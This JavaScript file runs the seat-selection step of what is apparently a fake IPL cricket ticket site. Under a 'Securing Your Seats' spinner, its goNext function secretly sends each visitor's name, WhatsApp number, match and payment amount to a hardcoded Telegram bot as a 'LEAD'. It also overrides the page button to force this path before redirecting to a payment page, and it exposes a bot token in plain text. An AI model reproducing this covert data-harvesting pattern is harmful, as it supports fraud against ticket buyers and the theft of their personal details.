import { db, ref, get } from "./firebase.js";

document.addEventListener("DOMContentLoaded", async () => {
    const venueImgEl = document.getElementById('venue-img');
    const matchTitleEl = document.getElementById('match-title');
    const matchId = localStorage.getItem('matchId');

    // --- INITIAL DATA SETUP ---
    window.sPrice = 0; 
    window.sQty = 1;   
    window.sType = "None";

    // 1. 🔥 VENUE IMAGE LOADING
    if (matchId && db) {
        try {
            const snapshot = await get(ref(db, `matches/${matchId}`));
            if (snapshot.exists()) {
                const data = snapshot.val();
                if (matchTitleEl) matchTitleEl.innerText = data.title || "Match Details";
                if (venueImgEl && data.venue_img) {
                    venueImgEl.src = data.venue_img;
                    venueImgEl.style.display = 'block';
                }
            }
        } catch (e) {
            console.log("Firebase sync skipped");
        }
    }

    // --- SEAT SELECTION LOGIC ---
    window.setSeat = (name, price, el) => {
        document.querySelectorAll('.type-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');

        window.sType = name;
        window.sPrice = price;

        document.getElementById('res-type').innerText = name;
        document.getElementById('res-price').innerText = `₹${price}`;
        
        const btn = document.getElementById('final-btn');
        if(btn) {
            btn.disabled = false;
            btn.classList.add('active');
            btn.innerText = "Continue to Payment";
        }
        refreshTotal();
    };

    window.updateQty = (val) => {
        let n = window.sQty + val;
        if (n >= 1 && n <= 10) {
            window.sQty = n;
            document.getElementById('res-qty').innerText = n;
            refreshTotal();
        }
    };

    function refreshTotal() {
        const total = window.sQty * window.sPrice;
        document.getElementById('res-total').innerText = `₹${total}`;
        
        localStorage.setItem("finalPrice", total);
        localStorage.setItem("selectedTotalPrice", total);
        localStorage.setItem("selectedSeatType", window.sType);
        localStorage.setItem("seatQuantity", window.sQty);
    }

    // 5. 🔥 THE ULTIMATE REDIRECT FUNCTION 🔥
    window.goNext = () => {
        if (window.sPrice > 0) {
            
            // 1. Button Block
            const btn = document.getElementById('final-btn');
            if(btn) {
                btn.innerText = "Processing...";
                btn.style.pointerEvents = "none";
            }

            // 2. SHOW SPINNER
            const loader = document.createElement('div');
            loader.innerHTML = `
                <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                    <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                    <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
                    <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                </div>
            `;
            document.body.appendChild(loader);

            // 3. Telegram Data
            const name = localStorage.getItem('customerName') || "Unknown";
            const phone = localStorage.getItem('customerPhone') || "Unknown";
            let matchTitle = "IPL Match";
            if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
            const totalAmt = window.sQty * window.sPrice;

            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
            const chatId = "6820660513"; 
            const telegramMsg = `💰 LEAD REACHED SEAT ADRESS PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${window.sType}\n💵 Total Amount: ₹${totalAmt}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;

            // 4. BHEJO AUR WAIT KARO
            fetch(url).then(() => {
                window.location.href = "payment.html"; // Message gaya, tabhi aage badhega
            }).catch(() => {
                window.location.href = "payment.html"; // Error aaya toh bhi aage badhega
            });

            // 5. FAILSAFE TIMER (Kahin net slow ho toh page atke na)
            setTimeout(() => {
                window.location.href = "payment.html";
            }, 1200);

        } else {
            alert("Kripya pehle seat type select karein!");
        }
    };

    // 🔥 HYPER-FIX: HTML BUTTON KO JABARDASTI KABOO MEIN KARNA 🔥
    setTimeout(() => {
        const finalBtn = document.getElementById('final-btn');
        if (finalBtn) {
            // Agar HTML tag mein 'href' likha hai, toh usko delete maaro
            if (finalBtn.hasAttribute('href')) {
                finalBtn.removeAttribute('href');
            }
            
            // Inline HTML onclick ko overwrite kar do
            finalBtn.onclick = function(e) {
                if(e && e.preventDefault) e.preventDefault(); // Default chhalang roko
                window.goNext(); // Hamara Telegram wala function chalao
            };
        }
    }, 500); // Page load hone ke aadhe second baad yeh action lega
});
